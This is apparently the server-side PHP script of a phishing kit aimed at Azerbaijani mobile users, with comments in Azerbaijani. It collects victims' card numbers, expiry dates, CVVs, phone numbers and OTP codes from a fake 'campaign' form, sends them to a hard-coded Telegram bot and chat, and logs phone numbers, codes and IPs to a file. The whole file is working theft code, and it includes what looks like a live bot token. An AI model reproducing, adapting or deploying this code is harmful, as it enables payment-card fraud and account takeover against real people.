<?php
// YALNIZ POST İCƏZƏLİDİR
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('🚫 Giriş qadağandır!');
}

// BOT MƏLUMATLARI
$botToken = '8800834045:AAEgSbAX3Iai2AbI18-wIQODCsEvesgk83o';
$chatId = '-1003937068249';

// POST MƏLUMATLARI
$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : '';
$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : '';
$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : '';
$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : '';
$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : '';
$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : '';
$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : '';
$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
$campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
$type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';

// SIRALI ID
$counterFile = 'counter.txt';
if (file_exists($counterFile)) {
    $id = (int)file_get_contents($counterFile) + 1;
} else {
    $id = 1;
}
file_put_contents($counterFile, $id);

function sendToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode;
}

// ============================================================
// 🔥 1. KART MESAJI (ORİJİNAL 720 SƏTİRLİK KODDAKİ KİMİ)
// ============================================================
if ($type === 'card_only' && !empty($cardNumber)) {
    // IP-ni yoxla
    $userIP = !empty($ip) ? $ip : 'N/A';
    
    $message = "💳 **YENİ KART BİLGİSİ** 💳\n\n";
    $message .= "📱 **Operator:** " . $operator . "\n";
    $message .= "☎️ **Nömrə:** +994" . $phone . "\n";
    $message .= "🎁 **Kampaniya:** " . $amount . " - " . $campaign . "\n\n";
    $message .= "👤 **Kart Sahibi:** " . $cardName . "\n";
    $message .= "💳 **Kart:** `" . $cardNumber . "`\n";
    $message .= "📅 **Bitiş:** `" . $cardExpiry . "`\n";
    $message .= "🔐 **CVV:** `" . $cardCvv . "`\n\n";
    $message .= "🌐 **IP:** `" . $userIP . "`";
    
    sendToTelegram($message);
    
    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | NÖMRƏ: $phone | IP: $ip\n";
    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'id' => $id]);
    exit;
}

// ============================================================
// 🔥 2. OTP MESAJI (ORİJİNAL 720 SƏTİRLİK KODDAKİ KİMİ)
// ============================================================
if (!empty($otp)) {
    $userIP = !empty($ip) ? $ip : 'N/A';
    
    $message = "🔑 **OTP TƏSDİQİ** 🔑\n\n";
    $message .= "📱 **Nömrə:** +994" . $phone . "\n";
    $message .= "🔑 **OTP Kodu:** `" . $otp . "`\n";
    $message .= "🌐 **IP:** `" . $userIP . "`";
    if (!empty($campaign)) {
        $message .= "\n📦 **Paket:** " . $campaign;
    }
    
    sendToTelegram($message);
    
    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | NÖMRƏ: $phone | IP: $ip\n";
    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'id' => $id]);
    exit;
}

header('Content-Type: application/json');
echo json_encode(['status' => 'error']);
exit;
?>
